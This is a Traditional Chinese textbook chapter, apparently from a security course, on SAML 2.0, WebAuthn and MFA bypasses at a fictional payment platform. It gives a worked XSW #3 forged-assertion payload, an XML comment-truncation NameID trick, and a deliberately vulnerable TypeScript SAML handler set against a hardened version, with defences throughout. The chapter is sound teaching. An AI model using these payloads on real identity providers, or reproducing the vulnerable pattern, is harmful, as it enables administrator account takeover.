# 第 5 章 企業單點登入與認證深水區（SAML 2.0、WebAuthn 與 MFA 繞過）

上一章我們拆解了 NexusPay 的 RS256 JWT（2048-bit RSA，有效期 `900 s`、JWKS 快取 TTL `300 s`）與 OAuth 2.0 授權碼流程。在 JWT 的世界裡，簽章鎖定的是一段扁平的 Base64URL 位元組序列——驗證器驗過的 `header.payload`，跟業務程式碼最後讀到的 JSON 物件，本來就是同一串資料。

但當 NexusPay 開始承接大型企業商戶，認證邊界就不再只是單純的 JSON Token 了。企業客戶要求與自家的身分提供者（IdP，像 Okta 或 Microsoft Entra ID）串接 **SAML 2.0** 單點登入（SSO）；而動到真金白銀的高風險結算提領（單戶基準餘額 `10,000` 分，即 `$100.00`），還得過 **WebAuthn / Passkey** 或 **多重要素驗證**（MFA）這第二道關卡。

為什麼底層的 RSA-2048、ECDSA P-256 與 SHA-256 密碼學明明固若金湯，企業登入與 MFA 防線卻還是屢屢被打穿？本章就來拆解協定解析與狀態機轉移縫隙裡的致命破口。

---

## 從你已知的出發

為什麼一份經過 IdP 用 RSA-2048 私鑰簽章、而且數位簽章百分之百驗證通過的 SAML 2.0 登入憑證，最後卻能讓一個普通商戶員工搖身一變，以平台最高管理員 `admin@nexuspay.example` 的身分直接登入後台？

因為 XML 跟扁平的 JWT 完全不同。SAML 2.0 採用的 XML Signature（XMLDSig）是一套「只簽局部子樹」的機制：驗章器根據 `<ds:Reference URI="#_assert_01">` 找到指定的節點，做完正規化（Canonicalization，過程中預設還會自動把 XML 註解全部剝掉）後算出雜湊。偏偏許多後端服務提供者（SP）在取登入帳號時，卻偷懶對整份 XML 呼叫 `getElementsByTagName("saml:NameID")[0]` 抓第一個出現的名字，或是用 `firstChild.nodeValue` 讀出被註解切斷的前半截字串。**驗章器看的是節點 B，業務邏輯讀的卻是節點 A**——這種「簽章驗證」與「業務取值」各看各的落差，正是 SAML、WebAuthn 位元旗標漏檢與多步驟 MFA 狀態機跳步的共同病根。

---

## 機制與推導

### 攻擊者目標與實質影響

打穿企業 SSO 與 MFA 的回報極高，因為攻擊者瞄準的往往直接是企業組織的最高權限帳號：

首先是**無密碼奪取企業管理員身分**。透過 XML 簽章包裝攻擊（XSW）或 XML 註解截斷，攻擊者只要拿一張自己合法登入拿到的普通 SAML 憑證，在本地改寫 DOM 結構並把 `<saml:NameID>` 換成企業管理員信箱，就能大搖大擺走進 NexusPay 企業商戶後台。

接著是**把 MFA 第二道防線變成空氣**。不管企業規定得多嚴格，只要後端的多步驟認證狀態機沒鎖死、WebAuthn 漏檢查一個位元旗標，或是備援碼端點沒把錯誤次數綁在單次挑戰（Challenge）上，駭客就能直接跳過第二因素驗證，把單戶 `10,000` 分（`$100.00`）的測試帳本提領一空。

更危險的是**攻擊鏈向內延伸**。一旦拿到企業管理員的合法會話，攻擊者就擁有了高權限的內部立足點，往後可以繼續探測跨租戶隔離邊界（見第 6 章），或觸及只對管理員開放的報表匯入與檔案解析器攻擊面（見第 9 章）。

---

### SAML 2.0 Assertion 結構與 XMLDSig 驗證鏈

在最常見的 SAML 2.0 HTTP-POST Binding 流程裡，企業員工在 IdP 登入成功後，瀏覽器會把一份 Base64 編碼的 `<samlp:Response>` 用 `POST` 送進 SP 的接收端點（Assertion Consumer Service，簡稱 ACS，例如 NexusPay 的 `POST /v1/auth/saml/acs`）。

打開這份 XML，裡面主要分成三層。最外層是信封 `<samlp:Response>`，記錄 `ID`、發送時間 `IssueInstant`、目的地 `Destination` 與對應哪一筆登入請求的 `InResponseTo`。

中間包著真正記載身分的 `<saml:Assertion>`，裡面有簽發者 `<saml:Issuer>`、裝著登入帳號 `<saml:NameID>` 的 `<saml:Subject>`、規定有效時間窗 `NotBefore` 與 `NotOnOrAfter` 的 `<saml:Conditions>`，以及記載角色群組的 `<saml:AttributeStatement>`。最後則是負責防偽的 `<ds:Signature>` 數位簽章，這個簽章可以簽在外層 `<Response>`、內層 `<Assertion>`，或是兩層都簽。

問題就出在 XMLDSig 驗證簽章的方式。它不像 JWT 那樣直接對整串 Base64 字串算雜湊，而是照著 `<ds:SignedInfo>` 裡的指示走完四個步驟：

```text
+-------------------------------------------------------------------+
| SAML 2.0 XMLDSig 簽章與驗章流程                                   |
+-------------------------------------------------------------------+
| 1. 定位目標節點 : 讀取 <ds:Reference URI="#_assert_01">           |
| 2. 套用轉換規則 : 執行 Enveloped Signature (移除 <ds:Signature>)  |
| 3. 執行正規化   : Exclusive C14N (屬性排序、命名空間正規化、去註解)|
| 4. 雜湊與驗章   : SHA-256(C14N位元組) == <ds:DigestValue>         |
|                   VerifyRSA(<ds:SignedInfo>正規化位元組, SigVal)  |
+-------------------------------------------------------------------+
```

看出這裡面的盲點了嗎？

在 RS256 JWT 裡，簽章直接綁死整串 `ASCII(Base64URL(Header) + "." + Base64URL(Payload))` 位元組。只要解析端拒收重複的 JSON 鍵名並共用同一份解碼結果，整個載荷一個字都動不了。

但 XMLDSig 只是一套**局部子樹簽章**。驗證器只關心兩件事：`<ds:SignedInfo>` 本身的 RSA 簽章對不對，以及 `URI="#_assert_01"` 指到的那棵子樹在跑完 Exclusive C14N 正規化之後，算出的 SHA-256 摘要跟 `<ds:DigestValue>` 一不一樣。

至於這棵子樹外面還塞了幾個沒簽章的 `<saml:Assertion>`？或者 `<NameID>` 裡面是不是藏了會在 C14N 階段被自動抹掉的 XML 註解？只要 SP 的業務程式碼沒有自己立規矩擋下來，單靠 XMLDSig 驗章器根本不會替你攔截。

---

### XML Signature Wrapping（XSW #1–#8）的樹狀移花接木

當「驗章函式庫去驗的節點」跟「SP 業務程式碼去讀的 `<NameID>` 節點」不是同一個，就會爆發大名鼎鼎的 **XML Signature Wrapping**（XSW，XML 簽章包裝攻擊）。

先直接看一張對照圖。最左邊是正常的 SAML Response；中間跟右邊則是攻擊者動手腳後的兩種經典變形（XSW #1 與 XSW #3）：

```text
[合法 Response]                  [XSW #1: 複製已簽章根節點包裹] [XSW #3: 兄弟 Assertion 前置插入]
<Response ID="_resp_ok">         <Response ID="_resp_evil">     <Response>
  <Signature ref="#_resp_ok"/>     <Assertion ID="_evil">         <Assertion ID="_evil">  <-- DOM[0] 先讀到
  <Assertion ID="_ok">               <NameID>admin</NameID>         <NameID>admin</NameID>
    <NameID>user</NameID>          </Assertion>                   </Assertion>
  </Assertion>                     <Signature ref="#_resp_ok">    <Assertion ID="_ok">    <-- 驗章通過
</Response>                          <ds:Object>                    <Signature ref="#_ok"/>
                                       <Response ID="_resp_ok">     <NameID>user</NameID>
                                         <Assertion ID="_ok">     </Assertion>
                                           <NameID>user</NameID> </Response>
                                         </Assertion>
                                       </Response>
                                     </ds:Object>
                                   </Signature>
                                 </Response>
```

在經典研究 *On Breaking SAML* 歸納出的 **XSW #1 到 XSW #8** 八種打法裡，背後的伎倆其實完全一樣：**把 IdP 簽好名的那塊合法節點原封不動留著（讓驗章器順順過關），同時在 DOM 樹的另一個角落塞進自己偽造、沒簽章的 `<Response>`、`<Assertion>` 或 `<NameID>`，騙業務解析器優先去讀那個假節點**。

這八種變體的差別，只在於「原本簽好名的真節點被搬去哪裡藏」以及「偽造的假節點插在哪個位置」：

| 變體編號 | 簽章原始位置 | 合法節點搬去哪裡藏 | 惡意未簽章節點插在哪 | 針對哪種解析盲點 |
|---|---|---|---|---|
| **XSW #1** | Response 層 | 整包原 Response 塞進 `<ds:Object>` 或 `<Extensions>` | 最外層換成新建的無簽章 `<Response>` | 驗章器在全文件搜 `ID`，業務層卻直接從根節點往下讀 |
| **XSW #2** | Response 層 | 原 `<Response>` 移到 `<ds:Signature>` 前方或平行結構 | 根 `<Response>` 裡面的 `<Assertion>` 換成假的 | 驗章與解析器沒嚴格檢查父子層級關係 |
| **XSW #3** | Assertion 層 | 原 `<Assertion>` 留在 `<Response>` 後半段不動 | 在原 `<Assertion>` 前面插進第一個假 `<Assertion>` | 業務層直接用 `getElementsByTagName("Assertion")[0]` 抓第一個 |
| **XSW #4** | Assertion 層 | 原 `<Assertion>` 塞進假 `<Assertion>` 裡面的 `<Extensions>` | `<Response>` 頂層直接放假 `<Assertion>` | XPath `//Assertion` 深度優先走訪時會先撞到外層的假節點 |
| **XSW #5** | Assertion 層 | 原 `<Assertion>` 內容被改寫，簽章被拆去包在 `<Extensions>` | `<Response>` 頂層直接放假 `<Assertion>` | 沒檢查簽章與受保護的 `<Assertion>` 必須是父子關係 |
| **XSW #6** | Assertion 層 | 原 `<Assertion>` 搬進 `<ds:Signature>` 裡面的 `<ds:Object>` | 原本的位置換成假 `<Assertion>` | 驗章器允許 `Reference` 指到 `<ds:Object>` 裡面去 |
| **XSW #7** | Assertion 層 | 原 `<Assertion>` 搬進 `<samlp:Extensions>` 裡面 | `<Response>` 的直接子節點放假 `<Assertion>` | XML Schema 沒限制 `<Extensions>` 裡面不准塞 `<Assertion>` |
| **XSW #8** | Assertion 層 | 類似 #7，把原 `<Assertion>` 塞進 `<ds:Object>` 並留著外殼 | 原本的位置換成假 `<Assertion>` 或 `<NameID>` | 專門對付只檢查 Response 第一層結構的解析器 |

注意到了嗎？不管用哪一招，攻擊者完全不需要偷到 IdP 的 RSA 私鑰。他只要先用自己的普通帳號合法登入一次，攔下那張還沒過期的已簽章 SAML Response，在自己電腦上剪貼一下 XML 節點順序再送出去，就能完成身分掉包。

---

### Worked Example：C14N 驗證器與 DOM `getElementsByTagNameNS(..., "NameID")[0]` 的節點分歧

光看表格還不夠有體感，我們直接拿一份 **XSW #3** 的真實 XML 封包，一步一步算給你看 Exclusive C14N 驗證器與 DOM 查詢是怎麼在同一個檔案裡分道揚鑣的。

假設攻擊者先用普通商戶帳號 `attacker@merchant.test` 從可信 IdP 拿到一份緊湊格式的合法簽章 Assertion（`ID="_assert_legit_01"`，元素之間沒有多餘空白）。接著他在 `<saml:Issuer>` 後面、真 Assertion 的正前方，硬塞了一個沒簽章的假 Assertion（`ID="_assert_evil_99"`），讓假節點排在 `<samlp:Response>` 裡的第一個 `<saml:Assertion>` 位置（即 `<samlp:Response>` 的第 2 個元素子節點）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_resp_7a91" Version="2.0"
                IssueInstant="2026-11-21T02:00:00Z">
  <saml:Issuer>https://idp.corp.example</saml:Issuer>

  <!-- [攻擊者插入點] 排在合法 Assertion 前面，成為第 1 個 Assertion 元素，沒有 <ds:Signature> -->
  <saml:Assertion ID="_assert_evil_99" Version="2.0"
                  IssueInstant="2026-11-21T02:00:00Z">
    <saml:Issuer>https://idp.corp.example</saml:Issuer>
    <saml:Subject>
      <saml:NameID>admin@nexuspay.example</saml:NameID>
    </saml:Subject>
  </saml:Assertion>

  <!-- [原始已簽章節點] IdP 簽章的目標，元素間緊湊無縮排空白，內容一字未改 -->
  <saml:Assertion ID="_assert_legit_01" Version="2.0" IssueInstant="2026-11-21T02:00:00Z"><saml:Issuer>https://idp.corp.example</saml:Issuer><ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo><ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/><ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/><ds:Reference URI="#_assert_legit_01"><ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms><ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>4p3kQ7...Base64SHA256...=</ds:DigestValue></ds:Reference></ds:SignedInfo><ds:SignatureValue>m9xR2v...RSA2048Sig...==</ds:SignatureValue></ds:Signature><saml:Subject><saml:NameID>attacker@merchant.test</saml:NameID></saml:Subject></saml:Assertion>
</samlp:Response>
```

當這份 XML 送進 NexusPay 後端，驗章器跟業務邏輯分別會看到什麼？我們直接攤開兩邊的運算過程：

```text
1. XMLDSig 驗證器（以 <ds:Reference URI="#_assert_legit_01"> 為準）：
   - 索引查詢：在整份 DOM 中尋找 @ID == "_assert_legit_01"
   - 命中節點：第 2 個 <saml:Assertion>（ID="_assert_legit_01"）
   - 套用 Transform 1（enveloped-signature）：移除該 Assertion 內的 <ds:Signature> 子樹
   - 套用 Transform 2（xml-exc-c14n#）：
     正規化輸出（移除註解、按字母順序排列屬性 ID/IssueInstant/Version、補齊可見命名空間 xmlns:saml；
     注意 Exclusive C14N 會保留節點集內原有的文字空白，這裡因為原始已簽章 Assertion 本來就是緊湊無空白字串，
     轉換後得到的單行正規化位元組序列如下，長度剛好是 139 + 51 + 78 + 17 = 285 bytes）：
     <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_assert_legit_01" IssueInstant="2026-11-21T02:00:00Z" Version="2.0"><saml:Issuer>https://idp.corp.example</saml:Issuer><saml:Subject><saml:NameID>attacker@merchant.test</saml:NameID></saml:Subject></saml:Assertion>
   - 計算 SHA-256 Digest：對上面這 285 bytes 的 C14N 輸入算 SHA-256，得出 32 bytes (256 bits) 摘要
   - 比對與驗章：因為 _assert_legit_01 的正規化位元組跟 IdP 當初簽發時一模一樣，
     算出來的摘要跟 <ds:DigestValue> 完全吻合，而且 IdP 對 <ds:SignedInfo> 的 RSA-2048 簽章也完全有效（回傳 true）

2. 脆弱的 SP 業務層（呼叫 doc.getElementsByTagNameNS(SAML_NS, "NameID")[0] 或 getElementsByTagName("saml:NameID")[0]）：
   - 前序深度優先走訪（Pre-order DFS）整棵 DOM 元素樹：
     元素 0: <samlp:Response>
     元素 1:   <saml:Issuer>
     元素 2:   <saml:Assertion ID="_assert_evil_99">
     元素 3:     <saml:Issuer>
     元素 4:     <saml:Subject>
     元素 5:       <saml:NameID>admin@nexuspay.example</saml:NameID>  <-- 命中 NodeList[0]！
     元素 6:   <saml:Assertion ID="_assert_legit_01">
     ... (元素 7 是 <saml:Issuer>，元素 8..18 是 <ds:Signature> 子樹共 11 個元素)
     元素 19:    <saml:Subject>
     元素 20:      <saml:NameID>attacker@merchant.test</saml:NameID>  <-- 排在 NodeList[1]
   - 業務層讀取 NodeList[0].textContent：直接拿到 "admin@nexuspay.example"
   - 最終結果：驗章靠著第 2 個節點 _assert_legit_01 順利過關，業務層卻拿第 1 個節點的 admin@nexuspay.example 發了管理員 Session。
```

這組推導把 XSW 的本質攤在陽光下：攻擊者連一個 bit 的密碼學簽章都沒偽造，純粹是利用 `URI="#_assert_legit_01"` 把驗章器的視線引到樹上的第 2 個分支，再讓 `NodeList[0]` 在深度優先走訪時一頭撞上排在第 1 個分支的假帳號。

---

### XML 註解截斷（Comment Truncation）與 C14N 的隱形橡皮擦

你可能會想：「那我在程式裡寫死整份 XML 只准有一個 `<Assertion>`，總該安全了吧？」

還真不一定。就算整份文件只有唯一一個 `<Assertion>`、連半個節點都沒搬動，攻擊者還是有一招能竄改登入身分，這就是著名的 **XML 註解截斷**漏洞（CERT/CC **VU#475445** 曾一口氣通報了多個主流 SAML 函式庫中招）。

先看一眼攻擊者動過手腳的 `<saml:NameID>` 長什麼樣：

```xml
<saml:NameID>admin@nexuspay.example<!-- -->.attacker.test</saml:NameID>
```

為什麼在信箱中間插一個空註解 `<!-- -->`，就能騙過 RSA-2048 簽章？

祕密出在 Exclusive C14N 的預設演算法（`http://www.w3.org/2001/10/xml-exc-c14n#`，注意尾巴沒有 `#WithComments`）。根據 W3C 規範，**不帶 `#WithComments` 的 C14N 在做正規化時，會把 XML 裡所有的註解節點當成空氣直接抹掉**。

假設攻擊者先在 IdP 註冊了一個合法的外部測試或子網域帳號，開頭剛好長得像目標管理員，叫做 `admin@nexuspay.example.attacker.test`。當他拿到 IdP 簽發的合法 Assertion 後，攔下封包，在 `.attacker.test` 前面塞進 `<!-- -->`。接下來神奇的事情發生了：

到了**驗章階段**，C14N 演算法一跑，自動把 `<!-- -->` 擦掉，前後兩段文字無縫黏回 `admin@nexuspay.example.attacker.test`。拿去算 SHA-256 雜湊，跟 IdP 原本簽的一模一樣，RSA 驗章當場大開綠燈！

但進到**業務解析階段**，預設保留註解的 XML DOM 解析器看到中間卡了一個 `<!-- -->`，會把 `<saml:NameID>` 裡面的內容切成三個子節點：`Text("admin@nexuspay.example")`、`Comment(" ")` 與 `Text(".attacker.test")`。

如果後端工程師或底層套件在取字串時，寫成了 `nameIdNode.firstChild.nodeValue`（只拿第一個子節點的值），後半段的 `.attacker.test` 就直接被切掉了，讀出來的登入帳號瞬間變成最高管理員 `admin@nexuspay.example`！

---

### IdP-initiated 與 SP-initiated 的重放與登入 CSRF 陷阱

除了 XML 結構問題，SAML 2.0 還有兩種不同的起手式，防重放的安全邊界差很多：

第一種是 **SP-initiated SSO**（從服務端發起）。使用者先連上 NexusPay（SP），NexusPay 產生一組隨機的請求編號 `<samlp:AuthnRequest ID="_req_9f2a...">` 並把瀏覽器導向 IdP；等 IdP 認證完送回 `<Response>` 時，裡面的 `InResponseTo="_req_9f2a..."` 必須對得上剛剛那組編號。

只要 SP 把這個 `_req_9f2a...` 跟發起登入的瀏覽器會話（例如透過 HttpOnly 的預登入 Cookie）綁在一起，並在驗章與核對 `Destination`、`Audience`、有效時間都通過的當下，用單一原子操作把這組請求 ID 核銷作廢，就能一舉擋掉跨會話重放與登入 CSRF。

第二種則是 **IdP-initiated SSO**（從 IdP 儀表板直接點圖示登入）。這種模式下，使用者沒先經過 SP，而是由 IdP 主動丟一份沒有 `InResponseTo` 的 `<Response>` 過來。

如果 SP 為了圖方便，無條件放行所有沒帶 `InResponseTo` 的 Assertion，馬上會引來兩種攻擊：

一是**登入 CSRF**。攻擊者把自己的合法 `<Response>` 包在一個自動送出的隱藏表單裡騙受害者點開，受害者的瀏覽器就會在不知情下登入成攻擊者的帳號（如果後面接著綁定信用卡或匯入資料，就會全部記到攻擊者名下）。

二是**時間窗內無限重放**。每張 Assertion 都有 `<Conditions NotBefore="..." NotOnOrAfter="...">` 規定的有效時間，而且很多 SP 還會多給一兩分鐘的時鐘偏差容許度（Clock Skew）。只要 SP 沒在 Redis 或資料庫裡把已經用過的 `Assertion/@ID` 原子化登記起來（且 TTL 必須完整蓋過 `NotOnOrAfter` 剩餘秒數加上最大時鐘偏差），在這個時間窗關上之前，任何人拿到這包 Assertion 都能重複刷出新 Session。

---

### WebAuthn / FIDO2 的七道伺服器驗證邊界

為了徹底防堵釣魚與密碼外洩，NexusPay 在大額提領確認時導入了 **WebAuthn / FIDO2（Passkey）**。很多工程師以為用了硬體金鑰就萬無一失，卻忽略了：硬體認證器只負責對 `authenticatorData || SHA-256(clientDataJSON)` 簽章，**如果後端伺服器少檢查裡面任何一個欄位，硬體級防護照樣破功**。

當前端呼叫 `navigator.credentials.get` 拿到簽章送回後端時，伺服器必須逐一核對以下七道邊界，少一道都不行：

```text
+-------------------------------------------------------------------+
| WebAuthn 伺服器端驗證邊界（缺一不可）                             |
+-------------------------------------------------------------------+
| 1. clientDataJSON.type      == "webauthn.get"                     |
| 2. clientDataJSON.challenge == Redis 單次隨機值 (立即原子取出銷毀)|
| 3. clientDataJSON.origin    == "https://merchant.nexuspay.example"|
| 4. authenticatorData[0:32]  == SHA-256(expectedRpId)              |
| 5. authenticatorData[32] (flags):                                 |
|    - bit 0 (UP, 0x01) == 1 (使用者在場 User Present)              |
|    - bit 2 (UV, 0x04) == 1 (本地使用者驗證完成，Step-Up 必檢)     |
| 6. authenticatorData[33:37] (索引 33..36 之 4B signCount):        |
|    - 若已存或新收計數非 0 且新值未遞增，依 RP 風險政策處置複製異常|
| 7. 憑證歸屬與簽章驗證: 確認 credentialId 屬於當前帳號，並以該憑證 |
|    已註冊公鑰驗證 authenticatorData || SHA-256(clientDataJSON)    |
+-------------------------------------------------------------------+
```

在實戰程式碼審查裡，最常抓到的就是下面三個致命疏漏：

第一個是**驗完沒立刻銷毀 `challenge`**。如果後端驗完簽章後，忘了把 Redis 裡的 `challenge` 刪掉（或是只設了幾分鐘的 TTL 卻允許被讀取多次），攻擊者只要攔下這包 WebAuthn 回應，就能在過期前無限重放。

第二個是**只看 `UP` 卻漏查 `UV` 旗標**。在 `authenticatorData` 第 32 個 byte 的 `flags` 裡面，bit 0（`0x01`，`UP`，User Present）只代表「有人摸了一下硬體金鑰」；而 bit 2（`0x04`，`UV`，User Verification）才代表「金鑰已經在本地驗過指紋、FaceID 或 PIN 碼」。

如果 NexusPay 的高風險提領確認只檢查了 `UP == 1` 卻沒強制要求 `UV == 1`，小偷只要撿到員工遺失的實體安全金鑰（且湊齊前置登入狀態），連 PIN 碼都不用猜，輕輕按一下金鑰按鈕就能把錢領走。

第三個是**沒核對 `credentialId` 到底屬於誰**。有些多租戶後端只驗了簽章合法、也確定這把公鑰有在系統註冊過，卻直接相信前端傳來的 `userHandle`，忘了檢查這組 `credentialId` 是不是真的掛在**當前登入的那個帳號**名下。結果攻擊者只要在同一個平台上自己註冊一把合法的 Passkey，就能拿自己的金鑰簽章，去幫別人的帳號蓋章放行。

---

### MFA 狀態機跳步與短驗證碼的暴力窮舉

看完了複雜的協定，最後我們來看最常在真實滲透測試裡被打穿的 **MFA 狀態機邏輯漏洞**。很多時候駭客根本不用碰密碼學，光靠下面三種設計失誤就能直接繞過 MFA：

第一種是**第一關就發了正式通行證（AAL1 與 AAL2 混為一談）**。使用者剛輸完帳號密碼通過第一關（Step 1），後端就急著把正式的 Session Cookie（或帶著 `role: "merchant_admin"` 的 JWT）發給瀏覽器，然後只在回傳的 JSON 裡寫一句 `{"require_mfa": true}` 叫前端跳轉到 `/mfa` 頁面。

如果後面保護提領 API `/v1/withdrawals` 的中介層只檢查「有沒有合法的登入 Session」，卻沒檢查這個 Session 裡面的驗證等級欄位是不是已經升到 `aal === 2`，攻擊者根本不用理會 `/mfa` 畫面，直接帶第一關拿到的 Cookie 打提領 API 就領到錢了。

第二種是**讓前端自己指定「現在要驗誰的 MFA」**。在第二關送出驗證碼 `POST /v1/auth/mfa/verify` 時，後端居然不是從第一關綁定的伺服器端暫存狀態（`pre_auth_token`）裡去查使用者是誰，而是直接讀取前端傳過來的 `{"userId": "target_id", "code": "123456"}` 或 Cookie 裡的 `verify_user=admin`。攻擊者只要先用自己的帳號過第一關，到了第二關再把封包裡的帳號換成受害者，就能移花接木。

第三種則是**低估了短位數驗證碼被暴力撞開的速度**。標準的 6 位數 TOTP（含前導零）總共只有 `1,000,000` 種組合；如果伺服器同時接受前後 `±1` 個 30 秒時間步（共涵蓋 `90 s` 視窗），隨便猜一發就中的機率高達 `k / 1,000,000`（其中 `1 ≤ k ≤ 3` 是這三個時間步裡不重複的有效號碼數，最高為 `3 / 1,000,000`）。要是系統用的是 4 位數十進位簡訊碼，那總共更只有區區 `10,000` 種組合！

很多團隊以為在 Nginx 或 Express 掛一個「每個 IP 每分鐘限打 N 次」的 Rate Limit 就夠了（甚至還誤信客戶端自己傳的 `X-Forwarded-For` 標頭）。但只要後端沒有把「錯誤嘗試計數器」死死綁在單次挑戰（`challenge_id`）上並規定錯 5 次立刻作廢，攻擊者只要掛個代理池換 IP，或用單一連線瞬間塞進高併發請求，幾秒鐘內就能把那 1 萬組號碼全部撞開。

---

## 故障模式與防禦

弄清楚攻擊手法後，我們直接看 NexusPay 企業商戶後台在工程上該怎麼把 SAML 2.0 與 Step-Up MFA 鎖死。順帶提醒一句：雖然 SAML 用的是 XML，自然也會面臨 **XML External Entity（XXE）** 的威脅，不過 DTD 與外部實體注入我們留到第 9 章專門拆解；在這裡只需要記住一條鐵律——所有 SAML 解析器的最前端，都必須無條件擋掉 `<!DOCTYPE` 與外部實體載入。

### 防禦 1：用三道硬邊界封死 XSW 與 XML 註解截斷

要徹底免疫 XSW #1–#8 與註解截斷，千萬別只靠「把 SAML 套件升級到最新版」就覺得高枕無憂，程式碼必須親自守住三條底線：

1. **在驗章前先拒收所有 XML 註解與 DTD**：別等 C14N 幫你擦掉註解！包裹一進來，先做詞法檢查或掃描 DOM 樹，只要看到任何 `Comment` 節點（`nodeType === 8`）或 `<!DOCTYPE`、`<!ENTITY`，當場回傳 `400 Bad Request` 踢掉，從源頭斬斷註解截斷的可能。
2. **鎖死單一 `<Assertion>` 與嚴格階層結構**：雖然 SAML 2.0 規格允許一個 `<Response>` 塞多個 `<Assertion>`，但真實的企業 SSO 登入根本用不到。直接在程式裡規定整份文件只准出現唯一一個 `<saml:Assertion>`，而且 `<ds:Signature>` 必須直接隸屬於 `<Response>` 或那個唯一的 `<Assertion>`，嚴禁 `<ds:Object>` 或 `<Extensions>` 裡面偷藏任何巢狀 `<Assertion>`。
3. **只從「已驗章的那棵子樹」裡面拿帳號**：徹底封殺對整份 XML 呼叫 `getElementsByTagNameNS(SAML_NS, "NameID")[0]`、`getElementsByTagName("saml:NameID")[0]` 或 `//saml:NameID`。驗章函式必須直接回傳**通過簽章驗證的那個 DOM 節點本體**（Verified Node），業務程式碼只能握著這個節點，順著唯一合法的路徑 `/saml:Assertion/saml:Subject/saml:NameID` 把完整文字讀出來。

看看下面這段 TypeScript 程式碼，對比一下脆弱寫法與加固後的防禦寫法差在哪裡：

```typescript
// [脆弱寫法] 驗章跟取值各走各的，同時暴露在 XSW #3 與註解截斷之下
async function verifySamlVulnerable(rawXml: string): Promise<string> {
  const doc = new DOMParser().parseFromString(rawXml, 'text/xml');
  const isValid = xmlCryptoVerify(doc); // 只確認文件裡「某個角落」有合法簽章
  if (!isValid) throw new UnauthorizedException('Invalid SAML signature');

  // 破口 1：NodeList[0] 直接抓全文件第一個 saml:NameID，根本不管它有沒有被簽章保護
  // 破口 2：firstChild.nodeValue 一撞到 <!-- --> 就會把後面的字全部切掉
  const nameIdNode = doc.getElementsByTagName('saml:NameID')[0];
  return nameIdNode.firstChild?.nodeValue ?? '';
}

// [防禦寫法] 前置擋掉註解/DTD + 強制單一 Assertion + 綁定已驗章節點取值 + Redis 防重放
async function verifySamlSecure(
  rawXml: string,
  redis: Redis,
  expectedInResponseTo: string,
  clockSkewSeconds = 60,
): Promise<string> {
  // 1. 直接拒收 DTD（防 XXE，見第 9 章）與 XML 註解（防 VU#475445 截斷）
  if (/<!DOCTYPE|<!ENTITY|<!--/i.test(rawXml)) {
    throw new BadRequestException('Forbidden XML construct');
  }

  // 2. 強制單一 Assertion 結構並驗章（若出現多個 <Assertion> 或簽章目標不是頂層唯一 Assertion，直接拋出 401 UnauthorizedException；這裡 NexusPay 把 SP Entity ID 與 ACS URL 設成同一個 URI，一併核對 Audience 與 Destination/Recipient）
  const verifiedAssertion = await verifyAndExtractSignedAssertion(rawXml, {
    expectedIssuer: 'https://idp.corp.example',
    expectedAudience: 'https://merchant.nexuspay.example/v1/auth/saml/acs',
    expectedInResponseTo,
    maxAssertions: 1,
  });

  // 3. 登記 Assertion/@ID 防重放（TTL 必須完整蓋過 NotOnOrAfter 剩餘秒數 + 容許時鐘偏差 clockSkewSeconds）
  const assertionId = verifiedAssertion.getAttribute('ID');
  const ttlSeconds = Math.max(
    1,
    verifiedAssertion.notOnOrAfterEpoch + clockSkewSeconds - Math.floor(Date.now() / 1000),
  );
  const acquired = await redis.set(`saml:used:${assertionId}`, '1', 'EX', ttlSeconds, 'NX');
  if (!acquired) {
    throw new UnauthorizedException('SAML assertion replay detected');
  }

  // 4. 只從剛剛驗過章的那棵子樹讀取完整字串（絕不用 firstChild.nodeValue）
  return verifiedAssertion.subject.nameId;
}
```

### 防禦 2：把 MFA 狀態機與 WebAuthn 挑戰鎖進 Redis 原子操作

為了保護 NexusPay 的商戶提領功能，我們參考 NIST SP 800-63B 的驗證保證等級概念，在後端的 Session 狀態裡明確切分兩個絕對不能混用的等級欄位：

剛用密碼或 SAML SSO 登入成功時，Session 只會拿到 **AAL1**（`aal: 1`，代表基礎登入態或 `pre_auth`），只准看一般唯讀畫面跟呼叫 `/v1/auth/mfa/*` 驗證介面。

任何提領或改設定的 API，都會被路由守衛 `Aal2Guard` 直接擋在門外。只有當使用者真正通過了 WebAuthn 或 TOTP 第二關驗證，後端才會把 Redis Session 裡的欄位升級成 **AAL2**（`aal: 2`）並蓋上 `verifiedAt` 時間戳記（或簽發短效的 Step-Up 專用權杖）。

在實作這道升級關卡時，有兩個工程細節決定了防線會不會被繞過：

第一，**WebAuthn 的挑戰必須「綁定操作、單次即毀、強制驗 UV」**。當使用者點下提領按鈕時，後端產生一組 32-byte 的密碼學隨機值 `challenge` 與獨立的流程編號 `challengeId`，把 `{ challenge, userId, sessionId, operation }` 一起存進 Redis 的 `webauthn:chal:<challengeId>`（設 `120 s` 過期）。

等前端送回簽章時，後端直接用 Redis 的 `GETDEL` 指令**在同一個原子操作裡把挑戰讀出來並當場刪掉**，接著核對裡面的 `userId`、`sessionId` 與操作範圍是不是完全吻合，確保每次挑戰只能用一次且不怕同會話並行操作互相覆蓋。呼叫驗證套件（像 `@simplewebauthn/server`）時，更要明確傳入 `expectedOrigin`、`expectedRPID` 與 `requireUserVerification: true`，強制確定 `flags & 0x04`（`UV` 旗標）為真才放行。

第二，**TOTP 與備援碼的錯誤次數必須綁在 `challengeId` 上原子扣除**。千萬別只靠外層的 IP 限流（當然，「申請發起挑戰」本身的頻率還是要設帳號與會話級的限流）。每當後端發出一個 MFA 挑戰時，先把 Redis 裡的錯誤計數設為 `0`。

